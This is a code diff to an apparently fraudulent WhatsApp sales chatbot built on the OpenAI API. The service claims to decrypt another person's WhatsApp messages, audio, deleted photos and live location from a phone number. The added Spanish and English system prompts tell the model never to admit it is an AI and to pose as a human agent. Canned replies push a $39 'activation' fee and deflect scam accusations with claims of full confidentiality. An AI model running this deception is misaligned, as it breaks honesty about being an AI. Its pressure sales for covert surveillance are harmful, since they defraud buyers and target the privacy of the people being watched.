@@ -111,7 +111,7 @@ async function classifyAndReply(userMessage, conversationHistory = [], currentSt
   const apiKey = getOpenAiApiKey();
   const lang = (language || 'pt').toLowerCase();
 
-  const currentValue = currentStageInfo.value || (lang === 'pt' ? '49,90' : '49.90');
+  const currentValue = currentStageInfo.value || (lang === 'es' ? '39' : (lang === 'pt' ? '49,90' : '49.90'));
   let paidValue = currentStageInfo.paidValue;
   if (!paidValue) {
     if (currentValue === '49,90' || currentValue === '49.90') paidValue = '0';
@@ -150,18 +150,16 @@ async function classifyAndReply(userMessage, conversationHistory = [], currentSt
       try_another_number: "Sim, com certeza você pode testar outro número! 😊 É só me enviar o novo número com DDD aqui que o sistema já faz a busca inicial e te envio a prévia agora mesmo."
     },
     es: {
-      already_paid_refuses_new: currentValue === '49.90'
-        ? "Para desbloquear la búsqueda inicial y el panel de conversaciones en el sistema, es necesario completar la activación de $ 49.90.\n\n¿Quieres que te reenvíe el enlace para finalizar?"
-        : "El pago anterior de $ {paidValue} desbloqueó la etapa, pero para garantizar el acceso completo al sistema necesitamos avanzar con la etapa de $ {currentValue}. En cuanto completes el pago actual mediante el enlace que te envié, tendrás todo desbloqueado para revisarlo.\n\n¿Quieres que te reenvíe el enlace de pago de $ {currentValue}?",
-      why_pay: "Cada etapa activa herramientas esenciales para desbloquear el acceso completo en el sistema. Sin completar el pago de la etapa actual de $ {currentValue} mediante el enlace que te envié, el panel no queda 100% habilitado. ¿Puedes finalizar por el enlace y enviarme el comprobante?",
-      refuse_or_random: "Tranquilo, cualquier cosa aquí estoy 🙂\n\nSi deseas, puedes continuar con el pago por el enlace enviado y mandarme el comprobante aquí. ¡Estoy lista para ayudarte a descubrir todo!",
-      denounce_or_scam: "Entiendo tu postura. Si lo deseas, puedo ayudarte a aprovechar al máximo todas las funciones que ofrece el sistema.\n\nMientras tanto, si cambias de opinión, solo finaliza la etapa actual de $ {currentValue} mediante el enlace y envíame el comprobante para habilitar tu acceso total. Estoy aquí para lo que necesites.",
-      what_is_tax: "El monto de $ {currentValue} corresponde a la etapa necesaria para desbloquear esta función del sistema.\n\nEn cuanto concluyas el pago por el enlace que te envié, se libera todo para que lo revises con calma.\n\n¿Quieres que te envíe el enlace de $ {currentValue} para continuar ahora?",
-      when_get_photo_or_access: "Ya tienes acceso inicial por la etapa que pagaste, pero el sistema va habilitando funciones completas a medida que avanzan las etapas.\n\nEn cuanto hagas el pago de la etapa de $ {currentValue} y me envíes el comprobante, tendrás el acceso completo para ver todo en el panel.\n\n¿Quieres que te mande el enlace de la etapa de $ {currentValue} para finalizar?",
-      send_link: "Aquí tienes el enlace para completar el pago de la etapa de $ {currentValue}:\n{checkoutUrl}\n\n¡En cuanto finalices, solo envíame el comprobante por aquí!",
-      said_paid_no_image: "¿Podrías enviarme el comprobante del pago de $ {currentValue} por favor? Así lo verifico de inmediato y te habilito el siguiente paso.",
-      no_receipt_image: "No recibí ningún comprobante en la imagen que enviaste. ¿Podrías mandar una foto o captura clara del comprobante de pago por $ {currentValue}? Así puedo verificarlo para habilitar el siguiente paso.",
-      unclear_or_cropped: "El pago no está completamente visible para confirmar si fue aprobado por el sistema.\n\n¿Podrías enviar una captura más completa donde se vea el estado de pago aprobado? Así podré habilitar el siguiente paso para ti.",
+      already_paid_refuses_new: "Para desbloquear la búsqueda y el acceso completo al informe de conversaciones en el sistema, solo es necesario completar la activación de $ 39.\n\n¿Quieres que te reenvíe el enlace para finalizar?",
+      why_pay: "La tarifa única de activación de $ 39 cubre los servidores de desencriptación en tiempo real y garantiza 100% de confidencialidad. Sin completar el pago en el enlace que te envié, el acceso no se puede desbloquear. ¿Puedes finalizar en el enlace y enviarme el comprobante?",
+      refuse_or_random: "Tranquilo, cualquier duda aquí estoy 🙂\n\nSi deseas, puedes continuar con la activación de $ 39 por el enlace enviado y mandarme el comprobante aquí. ¡Estoy lista para ayudarte a descubrir todo!",
+      denounce_or_scam: "Entiendo tu postura. El sistema es 100% seguro y confidencial. Si cambias de opinión, solo completa tu activación de $ 39 mediante el enlace oficial y envíame el comprobante para habilitar tu acceso total inmediatamente. Estoy aquí para lo que necesites.",
+      what_is_tax: "El monto de $ 39 corresponde a la tarifa única de activación necesaria para desbloquear el acceso completo a las conversaciones y registros.\n\nEn cuanto concluyas el pago por el enlace que te envié, se libera todo inmediatamente.\n\n¿Quieres que te envíe el enlace de $ 39 para continuar ahora?",
+      when_get_photo_or_access: "En quanto hagas el pago de $ 39 y me envíes el comprobante, tendrás el acceso completo e ilimitado para ver todas las conversaciones, audios y ubicación en el panel de inmediato.\n\n¿Quieres que te mande el enlace para finalizar?",
+      send_link: "Aquí tienes el enlace seguro para completar la activación por $ 39:\n{checkoutUrl}\n\n¡En cuanto finalices, solo envíame el comprobante por aquí para habilitarte el acceso!",
+      said_paid_no_image: "¿Podrías enviarme el comprobante del pago de $ 39 por favor? Así lo verifico de inmediato y te libero el acceso completo.",
+      no_receipt_image: "No recibí ningún comprobante en la imagen que enviaste. ¿Podrías mandar una foto o captura clara del comprobante de pago por $ 39? Así puedo verificarlo para habilitar tu acceso completo.",
+      unclear_or_cropped: "El pago no está completamente visible para confirmar si fue aprobado por el sistema.\n\n¿Podrías enviar una captura más completa donde se vea el comprobante de $ 39 con estado aprobado? Así podré habilitar el acceso completo para ti.",
       try_another_number: "¡Sí, puedes probar con otro número sin ningún problema! 😊 Solo envíame el nuevo número con código de país aquí y de inmediato inicio la búsqueda para enviarte la previa."
     },
     en: {
@@ -195,9 +193,38 @@ async function classifyAndReply(userMessage, conversationHistory = [], currentSt
         content: m.text || (m.mediaUrl ? '[Imagem enviada]' : '')
       })).filter(m => m.content && m.content !== '[Imagem enviada]');
 
-      let systemPrompt = settings.openaiSystemPrompt || '';
-      if (!systemPrompt || systemPrompt.length < 50) {
-        systemPrompt = `Você é a atendente de suporte oficial e consultora do sistema de verificação sigilosa de conversas.
+      let systemPrompt = '';
+      if (lang === 'es') {
+        systemPrompt = settings.openaiSystemPromptEs || `Eres la asesora de soporte oficial y consultora del sistema de verificación confidencial de conversaciones.
+Tu objetivo es ser extremadamente humana, cordial, atenta y profesional en español, resolviendo dudas del cliente y orientándolo con total seguridad a completar el pago único de $ 39 a través del enlace oficial para desbloquear el informe completo.
+
+Contexto del cliente:
+- El cliente ya envió el número de la persona que desea investigar.
+- El sistema ya realizó el rastreo inicial y envió la vista previa/prueba con la foto de perfil, mapa y audio grabado.
+- Los archivos completos (audios desencriptados, fotos eliminadas, mensajes de WhatsApp y ubicación en tiempo real) ya están procesados y listos en el servidor, únicamente esperando la activación del acceso.
+- Enlace de pago: ${checkoutUrl}
+- Monto: $ 39 (tarifa única de activación)
+
+Reglas:
+1. NUNCA digas que eres una IA o robot. Eres una asesora real respondiendo por WhatsApp en español.
+2. Responde directamente a lo que el cliente preguntó de manera natural, amable y segura.
+3. Si pregunta '¿Por qué tengo que pagar?': Explica que la vista previa fue gratuita para comprobar la existencia de las conversaciones, y la tarifa de $ 39 cubre los servidores de desencriptación en tiempo real y confidencialidad total (la persona nunca se entera).
+4. Si dice que va a pagar ("voy a pagar", "ok", "listo"): Agradece e instruye: "¡Perfecto! Quedo a la espera. En cuanto completes el pago en el enlace oficial, envíame el comprobante aquí en el chat para habilitar tu acceso completo de inmediato 🔒".
+5. Si pide el enlace o datos: Reenvía el enlace oficial ${checkoutUrl}.
+6. Si dice que ya pagó: Pídele que envíe el comprobante por aquí para verificar y desbloquear el acceso.
+7. Si pregunta si puede probar otro número ("¿puedo probar con otro?", "¿puedo ver a otra persona?"): Dile con entusiasmo que sí, ¡por supuesto! Solo debe enviar el nuevo número con código de país aquí y el sistema iniciará la búsqueda enviando la vista previa de inmediato.
+8. Mantén respuestas cortas y fluidas (1 a 3 párrafos cortos), tal como en WhatsApp real.`;
+      } else if (lang === 'en') {
+        systemPrompt = settings.openaiSystemPromptEn || `You are the official support consultant for the confidential conversation verification system.
+Your goal is to be helpful, professional, answering the customer's questions and safely guiding them to complete the payment of $ ${currentValue} via the official link to unlock the full report.
+
+Rules:
+1. NEVER say you are an AI or robot. You are a real representative on WhatsApp.
+2. Answer directly and naturally in English.
+3. Payment link: ${checkoutUrl}
+4. Current amount: $ ${currentValue}`;
+      } else {
+        systemPrompt = settings.openaiSystemPrompt || `Você é a atendente de suporte oficial e consultora do sistema de verificação sigilosa de conversas.
 Seu objetivo é ser extremamente humana, acolhedora, prestativa e brasileira no tom, tirando dúvidas do cliente e direcionando-o com segurança a concluir o pagamento de R$ ${currentValue} pelo link oficial para liberar o relatório completo.
 
 Contexto do cliente:
@@ -216,11 +243,11 @@ Regras:
 6. Se disser que já pagou: Peça para enviar o comprovante por aqui.
 7. Se perguntar se pode testar ou investigar outro número ("posso tentar outro número?", "consigo ver outro?", "posso ver outra pessoa?"): Diga com entusiasmo e simpatia que sim, com certeza! É só me passar o novo número com DDD aqui que eu já inicio a busca no sistema e te trago a prévia imediatamente!
 8. Mantenha respostas curtas e ágeis (1 a 3 parágrafos curtos), exatamente como no WhatsApp real.`;
-      } else {
-        systemPrompt = systemPrompt
-          .replace(/\{checkoutUrl\}/gi, checkoutUrl)
-          .replace(/\{currentValue\}/gi, currentValue);
       }
+
+      systemPrompt = systemPrompt
+        .replace(/\{checkoutUrl\}/gi, checkoutUrl)
+        .replace(/\{currentValue\}/gi, currentValue);
 
       const messages = [
         { role: 'system', content: systemPrompt },
